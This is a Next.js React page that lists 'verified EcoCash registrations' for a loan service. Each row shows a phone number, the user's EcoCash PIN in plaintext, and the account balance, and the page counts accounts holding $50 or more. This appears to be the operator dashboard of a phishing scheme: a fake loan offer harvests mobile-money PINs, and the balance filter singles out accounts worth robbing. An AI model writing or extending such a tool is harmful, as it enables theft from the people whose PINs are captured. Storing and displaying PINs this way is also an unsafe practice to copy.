"use client"

import { useEffect, useState } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"

interface Registration {
  id: string
  ecocashPhone: string
  ecocashPin: string
  verifiedAt: string
  status: string
  accountBalance: number | null
}

export default function RegistrationsPage() {
  const [registrations, setRegistrations] = useState<Registration[]>([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const fetchRegistrations = async () => {
      try {
        const response = await fetch("/api/registrations")
        const data = await response.json()
        setRegistrations(data)
      } catch (error) {
        console.error("Failed to fetch registrations:", error)
      } finally {
        setLoading(false)
      }
    }

    fetchRegistrations()
  }, [])

  const getBalanceStatus = (balance: number | null) => {
    if (balance === null || balance === undefined)
      return { text: "Not checked", color: "bg-gray-100 text-gray-800 dark:bg-gray-950 dark:text-gray-200" }
    if (balance >= 50)
      return {
        text: `$${balance.toFixed(2)} ✓`,
        color: "bg-green-100 text-green-800 dark:bg-green-950 dark:text-green-200",
      }
    return { text: `$${balance.toFixed(2)} ✗`, color: "bg-red-100 text-red-800 dark:bg-red-950 dark:text-red-200" }
  }

  return (
    <div className="container mx-auto py-8 px-4 min-h-screen bg-background">
      <div className="mb-8">
        <h1 className="text-3xl font-bold text-foreground mb-2">Verified EcoCash Registrations</h1>
        <p className="text-muted-foreground">Clients who verified their EcoCash account for loan applications</p>
      </div>

      {loading ? (
        <div className="text-center py-8 text-muted-foreground">Loading...</div>
      ) : registrations.length === 0 ? (
        <Card>
          <CardContent className="py-8 text-center text-muted-foreground">No verified registrations yet</CardContent>
        </Card>
      ) : (
        <>
          <div className="mb-4 flex items-center gap-2">
            <Badge variant="secondary">{registrations.length} verified clients</Badge>
            <Badge variant="secondary">
              {registrations.filter((r) => (r.accountBalance ?? 0) >= 50).length} with sufficient balance
            </Badge>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-3 px-4 font-semibold text-foreground">ID</th>
                  <th className="text-left py-3 px-4 font-semibold text-foreground">EcoCash Phone</th>
                  <th className="text-left py-3 px-4 font-semibold text-foreground">PIN Used</th>
                  <th className="text-left py-3 px-4 font-semibold text-foreground">Account Balance</th>
                  <th className="text-left py-3 px-4 font-semibold text-foreground">Status</th>
                  <th className="text-left py-3 px-4 font-semibold text-foreground">Verified At</th>
                </tr>
              </thead>
              <tbody>
                {registrations.map((reg) => {
                  const balanceStatus = getBalanceStatus(reg.accountBalance)
                  return (
                    <tr key={reg.id} className="border-b border-border hover:bg-muted/50 transition-colors">
                      <td className="py-3 px-4 text-sm text-foreground">{reg.id}</td>
                      <td className="py-3 px-4 text-sm font-mono text-foreground">{reg.ecocashPhone}</td>
                      <td className="py-3 px-4 text-sm font-mono text-foreground">{reg.ecocashPin}</td>
                      <td className="py-3 px-4 text-sm">
                        <Badge className={balanceStatus.color}>{balanceStatus.text}</Badge>
                      </td>
                      <td className="py-3 px-4 text-sm">
                        <Badge className="bg-green-100 text-green-800 dark:bg-green-950 dark:text-green-200">
                          {reg.status}
                        </Badge>
                      </td>
                      <td className="py-3 px-4 text-sm text-muted-foreground">
                        {new Date(reg.verifiedAt).toLocaleString()}
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  )
}
